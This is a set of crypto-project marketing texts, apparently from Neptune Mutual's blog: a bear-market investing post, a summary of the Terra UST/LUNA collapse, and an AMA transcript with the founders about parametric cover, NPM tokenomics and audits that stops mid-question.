swing, it’s prudent to look for ways to protect your assets and limit their exposure to risk. When faced with danger, you behave differently. Investors in a bear market are more sensitive to risk and are more likely to take more precautions to mitigate risk.</p><p>Smart investors take an interest in psychology. Understanding the dynamics of buying and selling behaviour matters. In a bear market, there is an increased appetite for thinking about risk and protecting against risk. One risk that is getting extensive attention is the possibility that exchanges could be hacked and digital assets stolen.</p><p>That’s exactly the behaviour that drives demand for Neptune Mutual’s parametric cover platform. The platform helps <a href="https://neptunemutual.com/" rel="follow">protect investors against exchange hacks</a> and dApp, DeFi, and smart contract exploits.</p><p>An increased appetite for mitigating risk would suggest that projects proposing digital asset protection would flourish in a bear market.</p><p>Protocols that protect assets, or diversify risks have the potential to provide stability and reduce losses. Minimising risk is helpful in a risk investment environment, and protocols that help do this are attracting the attention of smart investors.</p><p>Though the focus of attention for crypto traders often centres around market sentiment and hedging against price volatility, there are many who fail to take necessary precautions when it comes down to protecting their digital assets from hacks or exploits. This negligence can leave them vulnerable in ways that would never happen if more standard practices were followed by these professionals — a lesson we’ve seen time after again throughout recent months with devastating consequences across various industries.</p><p>The bear market has created some challenges for the crypto industry, but it has also opened up new opportunities. So what are the fundamentals that investors are looking for in a bear market investment opportunity?</p><p>It’s important to look for projects with a solid team that are committed to delivering value to the ecosystem they are building. The team should have an excellent track record and be transparent about their progress. A strong and engaged community is a good sign that the project has long-term potential.</p><p>Projects driven by stablecoins that help diversify assets, minimise risks, reward stakeholders with non-inflationary mechanisms (i.e. that are not endlessly printing tokens to give away), and have a sustainable long-term business model, are some of the underlying fundamentals of high-flying projects. These projects look less like your average crypto fish that a bear market might get its teeth into, and more like a sea eagle, taking its own direction, designed for its environment, the power and agility to bite back against crypto predators, and well out of the reach of the bear market below.</p><p>It’s difficult to find investment opportunities during <a href="https://www.forbes.com/sites/michaeldelcastillo/2022/05/17/cryptos-great-reset-how-digital-asset-investors-and-blockchain-will-come-back-from-cryptos-2-trillion-meltdown/?sh=6e9216243b1b" rel="nofollow noopener noreferrer">turbulent market times</a>. However, there are certain projects that show promise even in tough economic conditions. Neptune Mutual’s parametric cover platform allows cryptocurrency investors to purchase cover protection for their digital assets and helps them hedge against risks.</p><p>By doing your research and investing in projects with sound fundamentals, you can find great investment opportunities; you don’t need to get to the moon to fly above the bear market.</p><p>Investors have become more focused on long-term goals and HODLing investments for the longer term. This is a smart strategy, as it can help you <a href="https://www.nasdaq.com/articles/4-moves-to-make-in-a-crypto-bear-market" rel="nofollow noopener noreferrer">take advantage of bear markets</a> and make investment gains over the long term.</p><p>Bear markets are a natural part of financial market cycles, and they present opportunities for those who are patient and disciplined. Before you invest, make sure you understand the risks involved and better still make sure you take action to mitigate those risks. By taking a strategic and precautionary approach to investment and risk management, you can protect your investment portfolio from market volatility.

        html: '<p>On May 7, Terra’s ecosystem was targeted in what appeared to be a coordinated attack, resulting in one of the biggest drops in cryptocurrency prices since the financial crisis of 2008, wiping out billions of dollars in long positions on major exchanges.</p><p>For most of the week, the Terra-backed UST stablecoin caused problems with the Terra blockchain, which relies on the LUNA token to power it. As a result, there has been an unprecedented loss of wealth in stock, and cryptocurrency markets globally.</p><p>UST, which is programmed to keep its dollar peg at $1, is currently trading at $0.1718 as of this time of writing, having lost its dollar peg and putting LUNA and itself in a death spiral. The loss of faith from the community and aggressive panic selling prompted the price of LUNA to drop 99.9% and is currently trading at $0.0002347. After trading at an all-time high of $119 USD in recent months, the crypto native token has seen its value plummet by more than $41 billion.</p><h2 id="let-us-decipher-the-relationship-between-ust-and-luna-and-understand-this-catastrophic-crypto-market-event">Let us decipher the relationship between UST and LUNA and understand this catastrophic crypto market event:</h2><p>The Terra ecosystem uses LUNA tokens for the staking and mining of UST. The equivalent amount of UST is minted each time LUNA is burned. UST is an algorithmic stablecoin, which means that its value is tied to the underlying LUNA, rather than to real-world financial assets such as the USD. This means that LUNA tokens serve as collateral for UST and are responsible for UST’s long-term viability and stability.</p><p>UST aims to maintain equilibrium by minting and burning at a 1:1 ratio with LUNA. To put it simply, a user must burn an equal amount of LUNA in order to mint the equivalent amount of UST.</p><p>Although this increases capital efficiency, it makes UST’s survival entirely dependent on LUNA’s market demand. In the event that the market loses faith in them and starts trading large quantities of UST for LUNA, then both LUNA and UST are at risk of a death spiral attack.</p><h3 id="depegging-of-ust">Depegging of UST</h3><p>A series of multi-million dollar sales hampered the depegging of UST. To put it into perspective, On May 7th, a Curve pool experienced an $85 million swap from UST to USDC, which caused the pool’s liquidity providers to begin withdrawing their assets. UST’s peg was slightly lowered after a user sold $108 million worth of tokens on Binance, according to another on-chain data source.</p><p>Luna Foundation Guard (LFG) responded by deploying $1.5 billion of its reserves on May 8. There have been reports that they lent $750 million of BTC to market makers to be sold, and another $750 million of UST to purchase back BTC once the volatility had calmed.</p><p>A total of $2.86 billion had already been taken from the Terra lending protocol Anchor, which offered depositors in the U.S. a treasury yield of up to 20 percent. UST’s peg continued to collapse the following day, with its price on Binance dropping to $0.60.</p><p>By minting LUNA for UST, users could exit as more liquidity providers exited with what they had left. As a result, the LUNA supply went from 386 million to 32 billion in less than 48 hours, igniting the death spiral. LUNA’s price fell to $0.01 while UST’s plummeted to $0.225 on Binance.</p><p>This left the Terra network exposed to governance attacks, in which the majority of attackers might hypothetically collaborate to take control of the remaining assets while the network’s liquidity and staking reserves were at their lowest point. To avoid such scenarios in light of the recent dip in the value of the $LUNA token and the consequently lower attack costs, Terraform Labs, the company behind the Terra network, temporarily suspended the blockchain on May 12.</p><p>The arbitrage opportunity for users to burn UST and mint LUNA exists as long as the price of UST is below its peg. As a result, until the UST value is restored to its $1 peg, this arbitrage opportunity will continue to exist, creating a loop in which LUNA can always be obtained at a much discounted rate.</p><p>Many retail traders and financial institutions’ investments in LUNA and UST have lost a significant amount of their original value as a result of this. KSI, a YouTuber and Gogglebox star, with 157,000 Luna in his account, lost £2.8 million in a day, with his assets worth dropping over 99 percent, almost equal to $1000 on May 13.</p><p>In light of the UST-LUNA crisis, many analysts and crypto enthusiasts now expect the current bearish sentiment to deepen and last for a very long winter.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

We appreciate all of your assistance. In case you missed it, here’s a recap of the entire session!</p><p><strong><strong>Part 1. Introduction</strong></strong></p><p><strong><strong>Q1. Can you share more background about the founders?</strong></strong></p><p><strong><strong>Edward:</strong></strong> Binod is co-founder and CEO of Neptune Mutual. He has been involved in the blockchain industry from its outset and has extensive experience of writing and auditing smart contracts, exposing hacks and exploits, and developing a range of blockchain applications. He was previously the CTO of InvestaX.</p><p>Gillian is a co-founder of Neptune Mutual and the founder of Mulana Capital, a crypto VC fund. Prior to this, she was the CEO of Huobi Asset Management. She built that business line from scratch and managed to get the SFC virtual asset manager license in Hong Kong. Prior to Huobi, she has a decade-long working experience in the insurance industry and is well-connected within the Asian crypto community.</p><p>I am an adjunct Professor of Entrepreneurship at KEDGE business school. I am also a startup investor and mentor, and I manage a quantum materials deeptech startup. At Neptune Mutual, I manage operations and finance.</p><p>At Neptune Mutual: Binod is the yacht and he is captain of the yacht. He is the form of the project and provides the direction; Gillian is the sails, her network and knowledge provide the power that keeps our yacht elegantly driving forward at pace; and me … well, I am the keel … the rather heavy weight under the water line, ideally out of sight, that helps keep the boat upright when the wind blows and the sea gets choppy.</p><p><strong><strong>Q2. In the past few months we saw significant growth in our community and most of them have participated in testnet and are familiar with the protocol. There are also a few members who recently joined our community so do you want to provide a brief introduction to the project?</strong></strong></p><p><strong><strong>Binod:</strong></strong> The Neptune Mutual project safeguards the Ethereum community from cyber threats to contemporary financial products. Our investor network, partners, and community have all been formed on the principle of defending the Ethereum and other blockchain ecosystems from cyber threats.</p><p>Just like the traditional parametric cover products, Neptune Mutual cover pools provide guaranteed payouts upon triggering a set of the predefined event(s). These predefined events are also known as cover parameters. Cover parameters consist of rules and exclusions. Payouts can only occur when all cover conditions are met, no exclusions are present, and the incident is successfully resolved by the community. The term cover incident refers to a state in which all cover rules and exclusions have been met.</p><p>You can use our application in the Mumbai test network.</p><p><a href="https://test.neptunemutual.com/" rel="follow">https://test.neptunemutual.com/</a></p><p>Watch our YouTube videos to learn more about the project.</p><p><a href="https://www.youtube.com/c/NeptuneMutual/videos" rel="nofollow noopener noreferrer">https://www.youtube.com/c/NeptuneMutual/videos</a></p><p><strong><strong>Part 2. Questions from Community</strong></strong></p><p><strong><strong>Q1. What is the Major Concept behind the Parametric Cover Policy, and what was the Motivation behind its application to On-chain Crypto Security?</strong></strong></p><p><strong><strong>Binod</strong></strong>: Parametric covers vary from discretionary covers in several respects.</p><p>With parametric cover, all policyholders are eligible for payouts if predetermined events are triggered and resolved. One decision applies to everyone. In contrast, and as the name suggests, with discretionary cover, it is possible to discriminate against policyholders simply because the decision is given on a case-by-case basis.</p><p>With parametric cover, because you do not have to “explain” your case and “upload” proof of loss to a risk assessor or claim adjuster, the payouts are much faster with parametric models. Some discretionary cover products force you to submit your identity before you can purchase a policy. If you think about it, your identity might potentially be compromised if you disclose your personal details to a third party. A person’s identity is just as vital, if not more significant, than money for some individuals.</p><p>The primary motivation behind creating an on-chain cover product was to create an ecosystem where average investors can minimize their risks from hacks and exploits by enabling them to purchase policies (policyholders), assist platforms and ecosystems (cover creators) minimize their losses by crowdsourcing the investor protection fund, and provide community opportunities (LPs) to join cover projects as co-underwriters.</p><p>The design of Neptune Mutual is demand and supply driven. As and when usage of cover grows, the fee also increases, which makes it attractive for LPs to co-underwrite risk capital together with the cover creators.</p><p><strong><strong>Q2. Who are your competitors? Or are you an innovator? How do you feel about competition?</strong></strong></p><p><strong><strong>Gillian</strong></strong>: Among our many peers are Nexus Mutual, Unslashed, InsureAce, and Risk Harbor. With Neptune Mutual’s parametric cover model, which assures a payout after the incident is resolved by the community, we stand apart from our competitors since we don’t have to go through an individual claim evaluation process.</p><p>Neptune Mutual’s parametric model provides guaranteed payout to all policyholders if a trigger event is resolved without the need for an individual claim assessment. On the other hand, there have been times when only 30% of historical claims were paid by discretionary cover protocols.</p><p>However, compete may not be the right word, we actually believe that if DeFi covers projects as a whole becoming more successful, shall help drive market awareness and adoption of a variety of mechanisms to protect digital assets, and this is in everyone’s interests, including our own. So we will do everything we can to support the success and growth of all our peers as the proportion of digital assets that are protected by any kind of cover, still needs to be grown exponentially.</p><p><strong><strong>Q3. What qualifications are required to create an insurance cover? Are there any plans to face regular user covers?</strong></strong></p><p><strong><strong>Edward: </strong></strong>Cover creators can be CeFi platforms (crypto exchanges, custodians, etc.), DeFi or Metaverse protocols, or anyone looking to safeguard the reputation of their platform. Users of such platforms can purchase covers from the cover pool to hedge the risk of these assets against hacks or exploits.</p><p>Neptune Mutual will review and validate each cover creator prior to a cover pool being set up to ensure that the marketplace of cover pools has been created by reputable organizations that meet our minimum due diligence requirements in terms of security, transparency, and reliability.</p><p><strong><strong>Q4. Do you have any plans to do a code audit? Because safety issues are especially important</strong></strong></p><p><strong><strong>Binod: </strong></strong>Security is our top priority. Before our protocol is launched, we will publicly release our audit report(s). For the first round of the protocol audit, we’re collaborating with BlockSec. We are engaging another well-known auditor for the 2nd audit, and we expect to negotiate a long term partnership with an auditor for ongoing audit work both for our own project and also for the projects within our ecosystem.</p><p>As we have witnessed numerous supply-chain attacks against DeFi apps, smart contract audits alone is not enough. Neptune Mutual has been investing extensively in cybersecurity in order to protect itself against frequent, unique, and ever-evolving threats and risks.</p><p><strong><strong>1. Smart Contract Security</strong></strong></p><ul><li>Role-based access control</li><li>Well-structured, properly-defined, and fine-tuned ACL usage that conforms to the principle of least privilege</li><li>Internal Solidity security guidelines</li><li>Adherence to SWC Registry guidelines</li><li>Unit Testing &amp; Test Stories (BDD)</li><li>Source code analyzers: static, dynamic, and subscription based</li><li>Third-party smart contract audit(s)</li></ul><p><strong><strong>2.

Supply-chain Security and Monitoring</strong></strong></p><ul><li>Dependency audit</li><li>HTTP security</li><li>DNS security</li><li>Secrets and access key usage audits</li><li>Favoring pull over push when deploying</li></ul><p><strong><strong>5. Bug Bounties</strong></strong></p><p><strong><strong>Q5.Do you plan to work with other networks? In particular Avalanche and Celo?</strong></strong></p><p><strong><strong>Binod: </strong></strong>The Neptune Mutual protocol will initially be available on the main Ethereum network. Additionally, we want to support various blockchains in order to grow our cover marketplace. To support our mission of securing as many DeFi protocols as possible, we have been in constant communication with a number of blockchain projects, including Avalanche.</p><p><strong><strong>Q6. Do you plan to deploy multiple chains after the mainnet is launched, and why?</strong></strong></p><p><strong><strong>Gillian: </strong></strong>Technically, the Neptune Mutual protocol is chain agnostic and is able to support projects deployed on any chain. Using Ethereum, Neptune Mutual can handle and resolve incidents that have happened on other blockchains.</p><p>However, we do plan to deploy on more chains, provided we have strategic support from the chain and foresee good demand from the users active on that chain, as well as being able to deploy protocol liquidity natively into low-risk and high-quality lending protocols available on that chain to optimize the yield for liquidity providers.</p><p><strong><strong>Q7. Given there are quite a number of insurance protocols around. One of the key factors of making Neptune successful would be based on the clients they manage to onboard/insure. With Huobi as Neptune’s backer, would that mean Neptune will be insuring Huobi?</strong></strong></p><p><strong><strong>Gillian: </strong></strong>Indeed, there are many insurance protocols available, and we agree that the quality of cover pools is equally important.</p><p>We have been in discussions with Huobi since our early days. We think Neptune Mutual’s cover marketplace can contribute to supporting and enhancing an exchange’s insurance protection fund over time. Since we are still discussing details, we can’t say if Huobi will make a cover for the Neptune Mutual marketplace or not. Suppose there will be a dedicated cover pool created for Huobi, the people who are insuring Huobi are the liquidity providers, which can be anybody who finds the risk reward proposition attractive.</p><p>Please stay tuned for partnership announcements.</p><p><strong><strong>Q8. Does Neptune Mutual plan to integrate with a Privacy protocol to enable the purchase of policies in a private manner?</strong></strong></p><p><strong><strong>Binod: </strong></strong>Neptune Mutual does not have plans to support privacy protocols as of now.</p><p><strong><strong>Q9. Will it be possible to launch pools for startups?</strong></strong></p><p><strong><strong>Gillian:</strong></strong> Currently, creating a new cover is an invitation-only feature. It is possible to launch pools for new startup projects after we have conducted our due diligence and if the new projects are also willing to provide incentives to attract liquidity providers to support their own cover pool.</p><p><strong><strong>Q10. Will your platform create a deposit/loan function for users to interact directly without liquidity pools?</strong></strong></p><p><strong><strong>Gillian: </strong></strong>Since we are focusing on DeFi parametric covers, we do not have plans to create a lending protocol.</p><p>However, you can deposit USD stablecoin to receive PODs in a cover pool of your choice. PODs are income (or loss) bearing instruments that represent your share of the liquidity pool. In addition to this, you can also stake your PODs in the POD staking pool to receive extra income in the form of the cover project’s native tokens (not stablecoins).</p><p><strong><strong>Q11. Does Neptune Mutual plan to Run Validation Nodes in order to attract more developers and further decentralize the protocol?</strong></strong></p><p><strong><strong>Binod:</strong></strong> Because we are an application-layer protocol, there are no technical requirements for developing and/or running validator nodes. We’re inheriting Ethereum’s security and have no plans to build our own or one that’s in competition with Ethereum.</p><p>To achieve consensus, a cover incident must go through a governance process to reach a resolution. The incident resolution process is the key use case for the NPM governance token. Any NPM token holder can stake NPM and report an incident. The whole process will be based on proof of stake consensus to reach a resolution in 7 days.</p><p><strong><strong>Q12. Will the mainnet have its own pools or will there be already existing liquidity providers? Or will you provide your protocol features on partner sites?</strong></strong></p><p><strong><strong>Edward: </strong></strong>The Neptune Mutual protocol has a number of liquidity pools, namely: cover pool, bond pool, token staking pools, and POD staking pools.</p><p>Liquidity providers can join any pool of their choosing after having thoroughly assessed the underlying risks. The cover liquidity pools are denominated in stablecoins and have earnings in stablecoins via policy premiums, flash loans, lending interest, etc.</p><p>Bond pools, which provide discounted NPM tokens for the NPM/DAI Uniswap pair, are announced on a seasonal basis to fund cover pool liquidity and also enhance our token liquidity in DEXes.</p><p>Token staking pools will list ERC-20 tokens to be given as a reward to NPM token holders. POD staking pools are only available to the LPs who have supplied liquidity to select cover pools; LPs receive rewards in the format of the underlying projects’ tokens.</p><p>For our partners and integrators, a fully-audited SDK will be provided that brings full cover functionality to their frontend or backend application. In addition to the SDK, we also have an audited “NPMDistributor.sol” contract that can be used by third parties to sell our covers with an added fee that goes directly to them.</p><p><strong><strong>Q13. What’s your plan for mainnet launch? What is your strategy to tackle token inflation?</strong></strong></p><p><strong><strong>Binod</strong></strong>: Before our protocol is deployed on the mainnet, we plan to complete a couple of audits. We’re working with BlockSec on the first protocol audit. The second round of audits will start once we implement and fix all the suggestions provided by BlockSec. At a later date, we will announce the name of the second audit firm.</p><p>Regarding the inflation question, the NPM tokens are fixed and deflationary. We do not think inflation is healthy for an application-layer protocol’s token.</p><p>Additionally, we believe that onboarding “new users” by paying them and artificially inflating the numbers is not a sustainable business model and isn’t fair to the future users in the long run. We also strongly believe that it is impossible to sustain any percentage amount of guaranteed yield or returns, unless the token supply can be inflated. When there is inflation, it has a nasty side effect: it punishes the existing tokenholder community by diluting everyone proportionately.</p><p>Since our token is deflationary, I will instead describe how this works.</p><p>In order to create a cover, you need to pay an amount in NPM tokens as a fee, which is burned forever. You also need to stake a fixed minimum amount of NPM tokens to create a cover. When an LP provides liquidity to your cover pool, they too have to stake a fixed minimum amount of NPM tokens. Similarly, incident reporters stake NPM tokens to vote. The side which is found to be dishonest loses all of their stake, a portion of which is burned. Both burning and staking help in deflation. Burning reduces the total number of NPM tokens in circulation while staking reduces the number of tokens in circulation.</p><p>Since there will be an organic and ongoing demand of the NPM tokens whenever an incident occurs, the tokens that are staked for voting incident resolutions go out of circulating supply.</p><p>The Neptune Mutual protocol has a deflation mechanism that activates during consensus attacks, unlike other protocols that inflate their tokens to guard against consensus attacks. As we have recently seen well-motivated and highly-coordinated attacks against some protocols, the protocol governance committee will manually defend against any kind of governance attack if it occurs on Neptune Mutual. A lot of NPM tokens will be burnt as a consequence of attackers losing their tokens.</p><p><a href="https://docs.neptunemutual.com/covers/cover-reporting" rel="follow">https://docs.neptunemutual.com/covers/cover-reporting</a></p><p><strong><strong>Q14. When does the bug bounty program start? What are the specific contents? How regularly will Neptune Mutual hold Bug Bounty programs by being Security Conscious in making sure that they are safe enough from Hacks and Exploits, in order to provide enough assurance for insured assets?</strong></strong></p><p><strong><strong>Binod: </strong></strong>Detailed information about the bug bounty program will be made public when our protocol audit is complete and before the mainnet release. Our bug bounty programs will continue to be offered on a regular basis going forward.</p><p><strong><strong>Q15. What do you think about community building?</strong></strong></p><p><strong><strong>Edward:</strong></strong> Building an active and trusted community is very important for the success of Neptune Mutual. We are encouraged to see that over 20K users have tried our testnet, and we have also seen very high quality interactions from community members across our social media channels. We are also in touch with CeFi, DeFi, and Metaverse protocols, a number of which have announced their intent to create cover pools and/or provide liquidity on our platform. This has set a strong foundation for our mainnet launch. Going forward, we will continue to leverage our product strength, engage more stakeholders (cover creators, liquidity providers, policyholders, as well as NPM governance token holders) to create trustable and easy-to-claim cover solutions and help platforms and their users reduce their overall risk exposures.</p><p>We’ve built a thriving community of like-minded people who are actively engaging in our social channels, helping us test our solutions, and guiding our product development via feedback and feature requests. The Neptune Mutual community’s organic development is a significant testimony to the fact that the cryptocurrency and DeFi audience recognizes the value of a parametric-model for protection of digital assets on the blockchain. Our community’s enthusiastic support has allowed us to extend our outreach to a much broader audience than a typical DeFi project.</p><p><strong><strong>Q16. Will the ambassador program be launched, if so, when?</strong></strong></p><p><strong><strong>Edward: </strong></strong>The first season of the ambassador program is ready to go live. Please stay tuned in Discord, and of course you can also follow us on Twitter, YouTube and Medium etc. I’ll post all the links at the end of this session.</p><p><strong><strong>Q17. How often does Neptune Mutual plan integrations, AMAs, and giveaways with other projects in a way of Marketing the project?</strong></strong></p><p><strong><strong>Edward: </strong></strong>We have already conducted numerous giveaways. We plan to do AMAs with a number of regional communities and KOLs in the next few months. Around the mainnet launch, we will provide updates on new partnerships and new features, and we will, of course, hold regular update sessions across different media channels with our community.</p><p><strong><strong>Q18. Does Neptune Mutual plan to be a global project by integrating other languages in the application and community?</strong></strong></p><p><strong><strong>Edward: </strong></strong>Yes, definitely.</p><p>We believe it’s important to translate and distribute our content, website, web application, documentation, and other materials to a much broader non-English speaking audience throughout the globe.</p><p>Right now, our website offers 10 different language options, including English, Chinese, Indonesian, Japanese, Korean, etc. We will create specific language channels in Discord and hire country/regional moderators to support the local communities. If you are interested in the role, please do not hesitate to contact us.</p><p><strong><strong>Q19. Where can one easily access the protocols Documentation in order to see Tokenomics and other Features of the Project?</strong></strong></p><p><strong><strong>Edward: </strong></strong>You can find the details about our project here:</p><p><a href="https://docs.neptunemutual.com/" rel="follow">https://docs.neptunemutual.com/</a></p><p>Tokenomics to be added into the doc soon once the public round is finalized.</p><p><strong><strong>Q20. What is the use case of the NPM token? Will there be staking available that allows investors to become part of the insurer and obtain a high % of staking rewards? If yes, how would the staking yield be sustainable?</strong></strong></p><p><strong><strong>Binod: </strong></strong>The NPM tokens fuel the growth of the Neptune Mutual ecosystem. From creating a cover to adding liquidity, you need NPM tokens. You also need NPM tokens to resolve an incident, which is one of the important utilities. For detailed NPM token use cases, please view the documentation:</p><p><a href="https://docs.neptunemutual.com/" rel="follow">https://docs.neptunemutual.com/</a></p><p>As I mentioned earlier, any kind of high percentage (%) yield is a promise that is too good to be true. Think about it. Unless we dilute all token holders proportionally, new tokens can’t be minted and thus rewards can’t be given.</p><p>Also, the rewards given are not equally received by all users because some users simply want to store tokens in an offline cold storage wallet. Inflation can quickly climb to a point where whoever is early to sell benefits, and this encourages people to sell tokens and quickly get out and jump into the next project. We have seen this with numerous crypto projects and, therefore, we don’t think a high percentage (%) yield is a solution to attract users long term. Instead, we believe a product having a real use case creates demand. Where there is enough demand, supply follows.</p><p>Having said that, we plan to launch lower percentage seasonal staking rewards from time to time. Please note that we can’t inflate the NPM tokens by minting, and therefore all of our staking or reward pools are periodic in nature. Implying that a pool may run out of rewards, say, after 15 days of launch. And then, the next batch of reward allocations could come later. In addition to the staking reward, we also have bond pools where you can get discounted NPM tokens for a lockup period of 7 days, which will also be seasonal. The bond pool feature is used periodically to sponsor liquidity to cover pools. Those who provide stablecoin liquidity not only receive premium income, but they can also stake their PODs in the staking pools to get additional rewards directly from the cover project(s).</p><p><strong><strong>Q21. Will there be staking available that allows investors to become part of the insurer and obtain a high % of staking rewards? If yes, how would the staking yield be sustainable?</strong></strong></p><p><strong><strong>Binod: </strong></strong>Yes, cover pools will be available for general investors to become liquidity providers. We encourage our investor community to thoroughly examine all the cover parameters and quality of the underlying projects listed in our cover marketplace. Select the ones you’d like to participate in as a liquidity provider. Before you join a cover pool as a liquidity provider, please carefully assess your risks, such as capital depletion in the event of a hack or an exploit.</p><p>When you become a liquidity provider for a cover pool, you receive a POD as a proof of your deposit. You can stake your PODs in the staking pools to receive rewards. Sometimes, underlying cover projects can also provide rewards directly on their website. Please stay tuned as there will be many ways and it could be different on a case-to-case basis.</p><p>None of our staking yields will be ongoing. In other words, all of the rewards received by users will be periodic and based on the availability of the reward token. This is because NPM tokens are fixed in supply.</p><p><strong><strong>Q22. How does a Parametric Cover Policy handle a situation of a RugPull? if the project was not exploited (only Rug) and probably Incident didn’t occur? Will it Count it as Incident Occured and how does it tend to insure Users who had these Assets protected under a Cover Policy on Neptune Mutual?</strong></strong></p><p><strong><strong>Binod: </strong></strong>I am not sure if rug pulls can be predicted in advance. To begin with, cover creation is an invitation-only system. Meaning, the first batch of covers to be included in our marketplace will be vetted by us. We will gradually open up our platform to a much wider cover creator audience.</p><p>Coming back to the question, being a parametric cover marketplace, we can only handle cover incidents that are defined in the parameters and exclusions. A rug pull is not a coverable event unless it is included in the parameters.</p><p>Standard exclusions from cover policies will include any deliberate or malicious act by the project team or any trigger event resulting from gross misconduct or gross negligence on the part of the project team; this would include rug pulls.</p><p>Do note that our community consists of both policyholders and liquidity providers, and therefore, all parties must adhere to the parameters and exclusions written on the cover page.</p><p><strong><strong>Q23. Recently there have been hacks that have caused great damage to user properties. But protecting privacy is also important. So what technology does your project use to solve that problem and how is privacy secured? What do you think about Web3 in the future?</strong></strong></p><p><strong><strong>Binod: </strong></strong>Indeed, we have been covering some of the hacks in our weekly reports. If you haven’t already done so, I’d recommend you subscribe to our Medium blog and subscribe to our newsletter.</p><p>Regarding privacy, we don’t force you to become a member to use our protocol. The platform does not require any identity verification or signup. There is no exchange, storage, retrieval, or archival of any personally-identifiable information happening in our application or protocol. Since we don’t store your personal information, there is no possibility that your identity is going to be misused.</p><p>I think we are still early in terms of web3 innovation. Today, web3 has already made the web an open place to conduct commerce a reality. I am excited to see what the next big innovations are in the web3 and metaverse space.</p><p><strong><strong>Q23. Partnerships are like supplements where the combination is beyond the individual level. Can you name some of your newest partners who can help Neptune Mutual? Are there any partnerships to be made in the near future? Can you tell us with whom?</strong></strong></p><p><strong><strong>Gillian: </strong></strong>We issued a press release yesterday where we highlighted some investors that participated in the recent private round raise and briefly touched on how they perceive we can help their portfolio companies better address security risks via cover solutions. We’ve also brought on some more crypto exchanges in the private round, and we expect that they will become cover creators.</p><p>In order to give more specific colors, over the coming period, we plan to write and post highlights on each individual partner to elaborate on what role they will play within the Neptune Mutual ecosystem, and how we can achieve 1 + 1 &gt; 2 in more detail. Stay tuned.</p><p>Link to the fundraising announcement:</p><p><a href="https://cryptoslate.com/press-releases/neptune-mutual-protocol-raises-5-3m-in-a-private-funding-round-after-successful-testnet-launch/" rel="nofollow noopener noreferrer">https://cryptoslate.com/press-releases/neptune-mutual-protocol-raises-5-3m-in-a-private-funding-round-after-successful-testnet-launch/</a></p><p><strong><strong>Q25. When will be TGE and CEX/DEX listing</strong></strong></p><p><strong><strong>Gillian: </strong></strong>Initially planned to be rather soon, however considering the current market condition, we are consulting a number of stakeholders and shall inform the community at a later stage about more specifics</p><p><strong><strong>Q26. How does the CEO of the project look at the situation regarding UST as a cryptocurrency not like stablecoin? Could the Neptune protocol work and cover the losses of users (or how should I say it better) if they were customers of Neptune?</strong></strong></p><p><strong><strong>Binod: </strong></strong>Seeing the present state of LUNA, UST, and the Terra ecosystem makes me sad. As we’ve pointed out earlier, our goal is to expand alongside the blockchain community, but we also want to be helpful and supportive to our counterparts in the cover protocol industry.</p><p>Seeing so many investors lose their money in a matter of days crushes my heart. It would be great if things gradually improved for the Terra community.</p><p>Cybersecurity threats such as smart contract vulnerabilities and supply chain attacks are the focus of Neptune Mutual. In addition to NOT covering stablecoin-peg risks, we also have no plans to cover trading losses, such as liquidation.</p><p><strong><strong>Q27. Regarding Neptune Ecosystem, as a moat in Defi protocol, I would like to ask if there are any plans to cooperate with other Defi protocols in the future, such as UNI Curve Compound etc.</strong></strong></p><p><strong><strong>Binod</strong></strong>: The Neptune Mutual protocol is already integrated with reliable and proven protocols such as Uniswap, Aave, and Compound. As we have a relatively limited risk appetite, we are not aiming for exceptionally high and unsustainable yields. We will add additional integrations to stable and established protocols if it benefits our community.</p><p><strong><strong>Q28. Can the code audit report be made public? How does the vulnerability bounty program work?</strong></strong></p><p><strong><strong>Binod</strong></strong>: Definitely, all of our audit reports will be made public. Full details of the bug bounty program will be shared upon the launch of our protocol. The bounty program will be an always-ongoing campaign.</p><p><strong><strong>Q29. How do you see the relationship between the community and the project?</strong></strong></p><p><strong><strong>Gillian:</strong></strong> Neptune Mutual is committed to providing a friendly, safe, and welcoming environment for all, regardless of their level of experience, gender identity and expression, sexual orientation, disability, personal appearance, body size, race, ethnicity, age, religion, nationality, or other similar characteristics.</p><p>We see our relationship with the community as an integral part of our success. Without a thriving community, we will be unable to sustain the project in the long run. The community is what motivates us and contributes to our success.</p><p><strong><strong>Q30. In most ico or IDO for token sales,carried out in several platforms, one needs to hold a certain amount of tokens to be able to participate, thus those who don’t have much can’t participate in such pre-sale due to low capital, how does Neptune mutual intends to address this for it’s supportive community members?</strong></strong></p><p><strong><strong>Gillian: </strong></strong>We are in communication with a variety of fundraising platforms for the public round. Since not all platforms have been confirmed, we are unsure of the specifics. When communicating with fundraising platforms, we always ask if they permit whitelisted addresses to be allocated. On the basis of the fundraising portal, we will try to include community members in a whitelist for an allocation. This may be contingent on the approval of IDO launchpads or fundraising platforms, though. Please do not quote me on this in the future, but we will try our best for sure.</p><p><strong><strong>Q31. What kind of ecology is going to be created in the later development of our project?</strong></strong></p><p><strong><strong>Edward:</strong></strong> The design of Neptune Mutual’s cover protocol is driven by four underlying principles, namely:</p><ul><li>Maximizing security</li><li>Minimizing risk</li><li>Maximizing scalability</li><li>Maximizing User Experience (UX)</li></ul><p>All of these principles are integral to creating the best environment for each and every category of stakeholder within the Neptune Mutual ecosystem: cover creator, liquidity provider, cover policyholder, NPM tokenholder, and, of course, any token holder participating in the reporting mechanism or governance of the protocol.</p><p>So, in terms of our roadmap and future development, improving security for everyone in the NPM ecosystem will be a key focus for our team. This is likely to take many forms, from security data analytics to tools that help cover creators assess their own security risks.</p><p>We also have a number of ideas that we are working on in relation to developing our cover pool architecture to meet new and specific needs, such as digital asset managers with a portfolio of projects.</p><p><strong><strong>Part 3: Live QnA session with the community</strong></strong></p><p><strong><strong>Q1. Do you plan to issue NFTs? (@tkwn#7090)</strong></strong></p><p><strong><strong>Binod: </strong></strong>For sure, after the mainnet launch, we plan to issue and randomly drop some NTFs to our policyholders. Just to be clear, we will not sell any NFTs but give it to our community for free. Please expect our NTFs to be of premium quality. ;)</p><p><strong><strong>Q2. Do you plan to cover against real financial assets? For example, houses, appliances, etc. (@tkwn#7090)</strong></strong></p><p><strong><strong>Gillian: </strong></strong>In the future, we could cover a variety of different risks, but for the time being we will be focusing on blockchain security, hacks and exploits on DeFi, CeFi, and Metaverse.</p><p><strong><strong>Q3. How do you decide which projects will be covered? Can users make a request? (@tkwn#7090)</strong></strong></p><p><strong><strong>Gillian: </strong></strong>The cover creation is an invitation-only system. We are looking to onboard high-quality CeFi &amp; quality DeFi projects in our cover portfolio. You can reach out to us via our community channels.</p><p><strong><strong>Q4. Are you planning to increase the types of stable coins that will be covered by the policy? 